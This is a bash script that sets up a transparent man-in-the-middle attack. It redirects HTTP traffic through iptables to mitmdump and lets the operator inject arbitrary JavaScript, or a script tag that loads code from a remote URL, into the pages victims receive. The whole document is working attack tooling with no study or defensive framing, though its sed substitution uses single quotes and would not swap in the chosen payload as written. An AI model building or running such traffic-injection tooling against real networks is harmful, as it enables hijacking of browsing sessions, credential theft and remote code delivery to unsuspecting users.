#!/bin/bash

BROWN='\033[0;33m'
DGREY='\033[1;30m'
LPURPLE='\033[1;35m'
BLUE='\033[0;34m'
RED='\033[0;31m'
NC='\033[0m'

exit_fuc(){
	iptables -F
	iptables -F -t nat
	#echo '0' > /proc/sys/net/ipv4/ip_forward
}

conf_parameters(){
	echo '1' > /proc/sys/net/ipv4/ip_forward
	iptables -F
	iptables -F -t nat
	iptables -t nat -A PREROUTING -i eno1 -p tcp --dport 80 -j REDIRECT --to-port 8080
}

run(){
	stop
	mitmdump -s inject.py --mode transparent --listen-host 192.168.0.171 &
}
stop(){
	pkill mitmdump
}

menu(){
	printf "${BLUE}\n"
	printf "${BLUE}--> Options\n"

	printf "${BROWN}\t1) Set javascript code\n"
    printf "${BROWN}\t2) Set javascript url\n"

	printf "${BROWN}\t3) Print javascript code\n"
    printf "${BROWN}\t4) Print javascript url\n"

    printf "${BROWN}\t5) Run mitmdump\n"
    printf "${BROWN}\t6) Stop mitmdump\n"

    printf "${BROWN}\t$1) Exit\n\n"
    printf "${DGREY}#> "
    printf "${NC}"
}

if [[ $EUID -ne 0 ]]
then
    printf "${RED}ES IMPORTANTE CORRER EL PROGRAMA CON SUDO"
    exit
fi

conf_parameters

codefile="<script>alert(1234)</script>"
option_code=""
option_url=""

flag=true
while $flag
do
	
    max=7
    menu $max 
	read num

	if [ $num -eq 1 ]
	then
		printf "${DGREY}Code#> "
		printf "${NC}"
		read code
		option_code+="<script>$code</script>"
	elif [ $num -eq 2 ]
	then
		printf "${DGREY}Url#> "
		printf "${NC}"
		read url
		option_code+="<script src=\"$url\"></script>"
	elif [ $num -eq 3 ]
	then
		printf "\n${LPURPLE}$option_code\n"
	elif [ $num -eq 4 ]
	then
		printf "\n${LPURPLE}$option_url\n"
	elif [ $num -eq 5 ]
	then
		file=$(pwd)/inject.py
		new=$option_code$option_url
		echo $codefile 
		echo $new
		sed -i 's/$codefile/$new/' $file
		codefile=$option_code$option_url
	elif [ $num -eq 6 ]
	then
		stop
	elif [ $num -eq $max ]
	then
		flag=false
	else
		echo "Unknown command"
	fi
done






